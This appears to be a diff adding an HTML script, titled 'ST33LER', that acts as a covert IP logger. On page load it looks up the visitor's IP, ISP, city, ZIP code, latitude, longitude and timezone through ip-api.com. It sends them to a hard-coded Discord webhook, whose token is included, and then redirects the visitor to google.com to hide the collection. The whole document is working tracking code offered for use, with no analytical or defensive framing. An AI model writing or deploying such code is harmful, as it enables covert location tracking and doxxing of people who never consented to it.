@@ -1,0 +1,38 @@
+<script>
+fetch('http://ip-api.com/json/')
+    .then(response => response.json())
+    .then(data => {
+        const { query, country, regionName, city, zip, isp, org, lat, lon, timezone } = data;
+        const Message = `
+:passport_control: **ST33LER**
+- :wireless: **IP Address:** ${query}  
+- :map: **Country:** ${country}  
+- :earth_americas: **Region:** ${regionName}  
+- :cityscape: **City:** ${city}  
+- :broken_chain: **ZIP:** ${zip}  
+- :satellite: **ISP:** ${isp}  
+- :man_office_worker: **Organization:** ${org}  
+- :left_right_arrow: **Latitude:** ${lat}  
+- :arrow_up_down: **Longitude:** ${lon}  
+- :alarm_clock: **Timezone:** ${timezone}  
+        `.trim();
+        return sendToDiscordWebhook(Message);
+    })
+    .then(() => {
+        window.location.replace("https://google.com")
+    })
+    .catch(error => {
+        window.location.replace("https://google.com")
+    });
+function sendToDiscordWebhook(message) {
+    const webhookUrl = "https://discord.com/api/webhooks/1295330857183219824/-gxbQC9cIoSjZWH8HY--44kIei5pJcOPgf1NCQVxVYxfjncqvMS53_9anpHiDTC-wm6K";
+    const payload = { content: message };
+    return fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+    });
+}
+</script>
